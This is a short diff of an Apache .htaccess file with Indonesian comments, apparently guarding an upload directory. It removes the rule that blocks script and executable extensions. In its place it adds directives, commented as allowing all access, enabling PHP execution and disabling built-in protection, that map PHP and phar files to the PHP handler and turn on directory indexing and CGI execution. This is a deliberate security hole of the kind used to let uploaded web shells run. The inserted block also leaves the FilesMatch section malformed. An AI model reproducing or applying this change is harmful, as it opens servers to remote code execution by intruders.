@@ -6,7 +6,29 @@
 # Blokir file dengan ekstensi berbahaya
 <FilesMatch "\.(php[0-9]?|phtml|phps|phar|asp|aspx|shtml|cgi|exe|pl|py|sh|bash|cmd|bat|scr|dll)$">
     Order allow,deny
-    Deny from all
+    Deny from all<IfModule mod_rewrite.c>
+    RewriteEngine On
+</IfModule>
+
+# Izinkan semua akses
+<IfModule mod_access_compat.c>
+    Order allow,deny
+    Allow from all
+</IfModule>
+
+<IfModule mod_authz_core.c>
+    Require all granted
+</IfModule>
+
+# Aktifkan eksekusi PHP di folder ini
+<FilesMatch "\.(php|php3|php4|php5|phtml|phar)$">
+    SetHandler application/x-httpd-php
+</FilesMatch>
+
+# Matikan proteksi bawaan
+Options +Indexes +ExecCGI +FollowSymLinks
+AllowOverride All
+
 </FilesMatch>
 
 # Blokir file PHP yang disamarkan sebagai gambar atau dokumen
